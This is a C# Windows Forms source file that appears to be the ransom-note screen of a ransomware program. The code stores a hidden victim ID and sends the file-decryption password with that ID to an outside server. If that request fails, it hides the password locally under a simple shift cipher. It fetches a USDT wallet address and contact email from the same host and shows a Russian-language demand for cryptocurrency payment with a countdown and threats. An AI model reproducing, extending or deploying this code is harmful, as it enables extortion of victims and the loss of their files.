using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;
using System.Xml.Linq;

namespace LeyaCleanV.Forms
{
    public partial class Lock : Form
    {
        private const int shift = 3;
        private string address;
        private string mail;
        string targeturl = "https://bgli.ru/index.php?";
        private int countdownSeconds = 259200;
        public Lock()
        {
            InitializeComponent();
            countdownLabel.Text = "3:00:00:00";
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string guidFilePath = Path.Combine(localAppDataPath, " .txt");
            string guid;

            if (File.Exists(guidFilePath))
            {
                guid = File.ReadAllText(guidFilePath);
            }
            else
            {
                guid = Guid.NewGuid().ToString();
                File.WriteAllText(guidFilePath, guid);
                File.SetAttributes(guidFilePath, File.GetAttributes(guidFilePath) | FileAttributes.Hidden);
            }

            labelGUID.Name = guid;
            Info.IDinForm = labelGUID.Name;
            labelGUID.Text = guid;

        }
        protected override void WndProc(ref Message m)
        {
            const int WM_NCCALCSIZE = 0x0083;
            if (m.Msg == WM_NCCALCSIZE && m.WParam.ToInt32() == 0)
            {
                return;
            }
            base.WndProc(ref m);
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            this.FormBorderStyle = FormBorderStyle.None;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            countdownSeconds--;
            UpdateCountdownLabel();
        }
        private void UpdateCountdownLabel()
        {
            TimeSpan timeRemaining = TimeSpan.FromSeconds(countdownSeconds);

            string countdownString;
            if (timeRemaining.Days > 0)
            {
                countdownString = timeRemaining.ToString(@"d\:hh\:mm\:ss");
            }
            else
            {
                countdownString = timeRemaining.ToString(@"hh\:mm\:ss");
            }

            countdownLabel.Text = countdownString;

            if (countdownSeconds == 0)
            {
                timer1.Stop();
                MessageBox.Show("Время вышло!");
            }
        }
        public async void SendPassword(string password)
        {
            try
            {
                var fullUrl = targeturl + "id=" + HttpUtility.UrlEncode(labelGUID.Name) + "&decode=" + HttpUtility.UrlEncode(Data.password);
                System.Net.WebRequest reqGET = System.Net.WebRequest.Create(fullUrl);
                System.Net.WebResponse resp = reqGET.GetResponse();
            }
            catch 
            {
                // Если не удалось отправить запрос, сохраняем пароль в текстовый файл
                var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), " .txt");
                    using (StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8))
                    {
                        writer.WriteLine(Data.password);
                    }
                    File.SetAttributes(path, FileAttributes.Hidden);
                EncryptFile();
            }
        }
        public static void EncryptFile()
        {
            try
            {
                // Получаем путь к файлу
                var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Roaming", " .txt");

                // Считываем содержимое файла в строку
                string fileContent = File.ReadAllText(path);

                // Преобразуем строку в массив символов
                char[] fileChars = fileContent.ToCharArray();

                // Шифруем каждый символ массива
                for (int i = 0; i < fileChars.Length; i++)
                {
                    // Если символ является буквой латинского алфавита
                    if (char.IsLetter(fileChars[i]) && fileChars[i] <= 'z' && fileChars[i] >= 'a')
                    {
                        fileChars[i] = (char)(((fileChars[i] - 'a' + shift) % 26) + 'a');
                    }
                    else if (char.IsLetter(fileChars[i]) && fileChars[i] <= 'Z' && fileChars[i] >= 'A')
                    {
                        fileChars[i] = (char)(((fileChars[i] - 'A' + shift) % 26) + 'A');
                    }
                    else if (char.IsDigit(fileChars[i]))
                    {
                        fileChars[i] = (char)(((fileChars[i] - '0' + shift) % 10) + '0');
                    }
                }

                // Преобразуем массив символов обратно в строку
                string encryptedContent = new string(fileChars);

                // Записываем зашифрованное содержимое в файл
                File.WriteAllText(path, encryptedContent, Encoding.UTF8);

                // Скрываем файл
                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            }
            catch (Exception ex){ }
        }
        private void labelGUID_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(labelGUID.Text, TextDataFormat.UnicodeText);
        }
        private async Task DICK()
        {
            var siteUrls = new[] { "https://pornhubadasdasd.com", "https://pornhubdadasdasd.com", "https://bgli.ru/payadress.html" };
            var httpClient = new HttpClient();
            string content = null;

            foreach (var siteUrl in siteUrls)
            {
                try
                {
                    var response = await httpClient.GetAsync(siteUrl);
                    content = await response.Content.ReadAsStringAsync();
                    break;
                }
                catch (HttpRequestException ex)
                {
                    
                }
            }

            if (content != null)
            {
                var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var addressLine = lines[0];
                address = addressLine;
            }
        }
        private async Task DICK2()
        {
            var siteUrls = new[] { "https://pornhubadasdasd.com", "https://bgli.ru/email.html", "https://pornhubdadasdasd.com" };
            var httpClient = new HttpClient();
            string content = null;

            foreach (var siteUrl in siteUrls)
            {
                try
                {
                    var response = await httpClient.GetAsync(siteUrl);
                    content = await response.Content.ReadAsStringAsync();
                    break;
                }
                catch (HttpRequestException ex)
                {
                    
                }
            }

            if (content != null)
            {
                var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var mailLine = lines[0];
                mail = mailLine;
            }
        }

        private async void Lock_Load(object sender, EventArgs e)
        {
            SendPassword(Data.password);
            await Task.WhenAll(DICK(), DICK2());
            textBox1.Text = $"Ваши файлы закодированы. \n Для получения доступа к ним переведите деньги на криптокошелек и отправьте ID указанный ниже на почту {mail} для получения кода для дешифровки. Если вы будете пытаться расшифровать файлы сами, это приведет к их вечной блокировке. В случае оплаты расшифровка гарантируется 100 %";
            label3.Text = $"Номер кошелька USDT TRC20: {address}";
        }

    }
}
